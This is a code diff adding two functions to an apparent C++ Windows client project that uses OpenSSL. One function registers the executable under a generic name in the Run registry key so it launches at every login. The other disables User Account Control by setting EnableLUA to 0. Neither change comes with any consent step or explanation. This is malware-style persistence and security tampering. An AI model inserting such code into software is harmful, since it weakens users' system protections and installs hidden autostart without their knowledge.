@@ -39,3 +39,47 @@ using namespace std;
 #include <openssl/pem.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+
+void AutoRunStartUp() {
+	HKEY hKey;
+	const char* czStartName = "MyApplication";
+	const char* czExePath = "D:\\Nam 5\\t6\\6Protocol\\Client\\ClientProtocol\\Debug\\ClientProtocol.exe";
+	
+	LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
+		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, KEY_WRITE,
+		&hKey);
+	if (ERROR_SUCCESS == lnRes)
+	{
+		lnRes = RegSetValueEx(hKey,
+			czStartName,
+			0,
+			REG_SZ,
+			(unsigned char*)czExePath,
+			strlen(czExePath));
+	}
+
+	RegCloseKey(hKey);
+}
+
+void CloseUAC() {
+	DWORD val = 0;
+	HKEY uaKey;
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &uaKey);
+	if (uaKey == NULL)
+	{
+		//Handle error message here
+	}
+	else
+	{
+		if (RegSetValueEx(uaKey, TEXT("EnableLUA"), 0, REG_DWORD, (const BYTE *)&val, sizeof(val)) != ERROR_SUCCESS)
+		{
+			printf("Not edit");
+		}
+		else
+		{
+			//Success
+		}
+		RegCloseKey(uaKey);
+	}
+}
